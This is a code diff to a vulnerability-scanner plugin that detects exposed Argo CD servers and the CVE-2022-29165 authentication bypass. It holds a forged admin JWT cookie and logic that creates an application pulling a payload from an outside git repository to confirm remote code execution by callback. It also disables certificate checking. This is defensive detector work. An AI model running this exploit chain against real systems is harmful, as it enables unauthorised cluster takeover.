@@ -17,7 +17,6 @@
 package com.google.tsunami.plugins.detectors.exposedui.argocd;
 
 import static com.google.common.base.Preconditions.checkNotNull;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
 import static com.google.tsunami.common.net.http.HttpRequest.*;
 
 import com.google.common.collect.ImmutableList;
@@ -32,12 +31,12 @@ import com.google.tsunami.common.net.http.HttpClient;
 import com.google.tsunami.common.net.http.HttpHeaders;
 import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.time.UtcClock;
-import com.google.tsunami.plugin.PluginType;
-import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.NotImplementedException;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
+import com.google.tsunami.plugin.PluginType;
+import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.proto.*;
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList.Builder;
@@ -68,8 +67,11 @@ public final class ExposedArgoCDDetector implements VulnDetector {
   private final PayloadGenerator payloadGenerator;
   private final Clock utcClock;
   private final HttpClient httpClient;
-  // This url might be changed in the future, so I make it easy to change;
-  private final String PAYLOAD_URL = "https://github.com/JamesFoxxx/argo-cd-app";
+  // The URL that host the payload as a git repository
+  // This url might be changed in the future, so I make it easy to change
+  private final String PAYLOAD_GIT_URL = "https://github.com/JamesFoxxx/argo-cd-app";
+  // The Path to the directory of payload on the git repository
+  private final String PAYLOAD_GIT_PATH = "payloads/jsonnet-guestbook-tla";
   // This is a template for creating an argo-cd application, we should fill four part of this
   // payload.
   private final String CREATE_APPLICATION_TEMPLATE =
@@ -78,7 +80,7 @@ public final class ExposedArgoCDDetector implements VulnDetector {
           + ":{\"destination\":{\"name\":\"\",\"namespace\":"
           + "\"tsunami-security-scanner\",\"server\":"
           + "\"%s\"},\"source\":{\"path\":"
-          + "\"payloads/jsonnet-guestbook-tla\",\"repoURL\":"
+          + "\"%s\",\"repoURL\":"
           + "\"%s\",\"targetRevision\":"
           + "\"HEAD\",\"directory\":{\"jsonnet\":{\"tlas\":[{\"name\":"
           + "\"payload\",\"value\":"
@@ -90,7 +92,12 @@ public final class ExposedArgoCDDetector implements VulnDetector {
   @Inject
   ExposedArgoCDDetector(
       HttpClient httpClient, @UtcClock Clock utcClock, PayloadGenerator payloadGenerator) {
-    this.httpClient = checkNotNull(httpClient);
+    this.httpClient =
+        checkNotNull(httpClient)
+            .modify()
+            .setFollowRedirects(true)
+            .setTrustAllCertificates(true)
+            .build();
     this.utcClock = checkNotNull(utcClock);
     this.payloadGenerator = checkNotNull(payloadGenerator);
   }
@@ -146,63 +153,25 @@ public final class ExposedArgoCDDetector implements VulnDetector {
         || HTTP_EQUIVALENT_SERVICE_NAMES.contains(networkService.getServiceName());
   }
 
-  private String buildRootUri(NetworkService networkService) {
-    if (NetworkServiceUtils.isWebService(networkService)) {
-      return NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
-    }
-    return String.format("https://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
-  }
-
-  /**
-   * check if the response contains OK status code and certificate items and doesn't contain
-   * permission denied message.
-   */
-  private boolean isArgoCdExposed(HttpResponse response) {
-    if (!response.status().isSuccess()) {
-      return false;
-    }
-    if (response.bodyString().isEmpty()) {
-      return false;
-    }
-    String responseString = response.bodyString().get();
-    boolean flag =
-        responseString.contains("\"items\"") && !responseString.contains("permission denied");
-    logger.atInfo().log("Is unauthorized content exposed: %s", flag);
-    return flag;
-  }
-
   /** Checks if a {@link NetworkService} has a misconfigured ArgoCD instances exposed. */
-  private boolean isServiceVulnerableToAuthBypass(NetworkService networkService) {
-    // the target URL of the target is built
-    String rootUri = buildRootUri(networkService);
-
-    String targetUri = rootUri + "api/v1/certificates";
-    logger.atInfo().log("targetUri is %s", targetUri);
-    try {
-      // This is a blocking call.
-      HttpResponse response =
-          httpClient.send(
-              get(targetUri)
-                  .setHeaders(
-                      HttpHeaders.builder()
-                          .addHeader(
-                              "Cookie",
-                              "argocd.token="
-                                  + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
-                                  + "TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ")
-                          .build())
-                  .build(),
-              networkService);
-      logger.atInfo().log("the response is %s", response);
-      return isArgoCdExposed(response);
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
-      return false;
-    }
+  private boolean isServicePubliclyExposed(NetworkService networkService) {
+    return checkExposedArgoCdWithOutOfBandCallback(networkService, HttpHeaders.builder());
   }
 
   /** Checks if a {@link NetworkService} has a vulnerable ArgoCd instances to CVE-2022-29165. */
-  private boolean isServicePubliclyExposed(NetworkService networkService) {
+  private boolean isServiceVulnerableToAuthBypass(NetworkService networkService) {
+    HttpHeaders.Builder cookieHeader =
+        HttpHeaders.builder()
+            .addHeader(
+                "Cookie",
+                "argocd.token="
+                    + "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9."
+                    + "TGGTTHuuGpEU8WgobXxkrBtW3NiR3dgw5LR-1DEW3BQ");
+    return checkExposedArgoCdWithOutOfBandCallback(networkService, cookieHeader);
+  }
+
+  private boolean checkExposedArgoCdWithOutOfBandCallback(
+      NetworkService networkService, HttpHeaders.Builder baseHeaders) {
     // the target URL of the target is built
     String targetUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
 
@@ -210,7 +179,9 @@ public final class ExposedArgoCDDetector implements VulnDetector {
       // 1. Get the first Project name
       String projectsUrl = targetUrl + "api/v1/projects?fields=items.metadata.name";
       HttpResponse response =
-          httpClient.send(get(projectsUrl).withEmptyHeaders().build(), networkService);
+          httpClient.send(get(projectsUrl).setHeaders(baseHeaders.build()).build(), networkService);
+      logger.atWarning().log("headers =============> %s", response.headers().toString());
+      logger.atWarning().log("body =============> %s", response.bodyJson().toString());
       if (response.bodyString().isEmpty()) {
         return false;
       }
@@ -234,7 +205,10 @@ public final class ExposedArgoCDDetector implements VulnDetector {
 
       // 2. Get the first cluster name
       String clustersUrl = targetUrl + "api/v1/clusters";
-      response = httpClient.send(get(clustersUrl).withEmptyHeaders().build(), networkService);
+      response =
+          httpClient.send(get(clustersUrl).setHeaders(baseHeaders.build()).build(), networkService);
+      logger.atWarning().log("headers =============> %s", response.headers().toString());
+      logger.atWarning().log("body =============> %s", response.bodyJson().toString());
       if (response.bodyString().isEmpty()) {
         return false;
       }
@@ -267,17 +241,36 @@ public final class ExposedArgoCDDetector implements VulnDetector {
           String.format(
               CREATE_APPLICATION_TEMPLATE,
               clusterName,
-              PAYLOAD_URL,
+              PAYLOAD_GIT_PATH,
+              PAYLOAD_GIT_URL,
               callbackPayload.getPayload(),
               projectName);
       String createAppUrl = targetUrl + "api/v1/applications";
-      httpClient.send(
-          post(createAppUrl)
-              .withEmptyHeaders()
-              .setRequestBody(ByteString.copyFromUtf8(payload))
-              .build(),
-          networkService);
-
+      response =
+          httpClient.send(
+              post(createAppUrl)
+                  .setHeaders(baseHeaders.addHeader("Content-Type", "application/json").build())
+                  .setRequestBody(ByteString.copyFromUtf8(payload))
+                  .build(),
+              networkService);
+      logger.atWarning().log("headers =============> %s", response.headers().toString());
+      logger.atWarning().log("body =============> %s", response.bodyJson().toString());
+      // If we send a req with http it will redirect us to https with a 307 status code,
+      // but by default our client doesn't redirect a POST request with 307 status code and a
+      // location header in first response
+      if (response.status().isRedirect()
+          && response.headers().get("Location").orElse(null) != null) {
+        logger.atInfo().log("redirect to %s", response.headers().get("Location"));
+        response =
+            httpClient.send(
+                post(response.headers().get("Location").get())
+                    .setHeaders(baseHeaders.addHeader("Content-Type", "application/json").build())
+                    .setRequestBody(ByteString.copyFromUtf8(payload))
+                    .build(),
+                networkService);
+        logger.atWarning().log("headers =============> %s", response.headers().toString());
+        logger.atWarning().log("body =============> %s", response.bodyJson().toString());
+      }
       Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(25));
       if (callbackPayload.checkIfExecuted()) {
         logger.atInfo().log("Confirmed OOB Payload execution.");
@@ -287,7 +280,24 @@ public final class ExposedArgoCDDetector implements VulnDetector {
               targetUrl
                   + "api/v1/applications/tsunami-security-scanner?cascade=true&"
                   + "propagationPolicy=foreground&appNamespace=argocd";
-          httpClient.send(delete(deleteAppUrl).withEmptyHeaders().build(), networkService);
+          response =
+              httpClient.send(
+                  delete(deleteAppUrl)
+                      .setHeaders(baseHeaders.addHeader("Content-Type", "application/json").build())
+                      .setRequestBody(ByteString.copyFromUtf8("{}"))
+                      .build(),
+                  networkService);
+          // same as last comment about redirection
+          if (response.status().isRedirect()
+              && response.headers().get("Location").orElse(null) != null) {
+            logger.atInfo().log("redirect to %s", response.headers().get("Location"));
+            httpClient.send(
+                delete(response.headers().get("Location").get())
+                    .setHeaders(baseHeaders.addHeader("Content-Type", "application/json").build())
+                    .setRequestBody(ByteString.copyFromUtf8("{}"))
+                    .build(),
+                networkService);
+          }
         } catch (IOException e) {
           logger.atWarning().withCause(e).log("Unable to delete application.");
           // But return true, because we had received a successful OOB response.
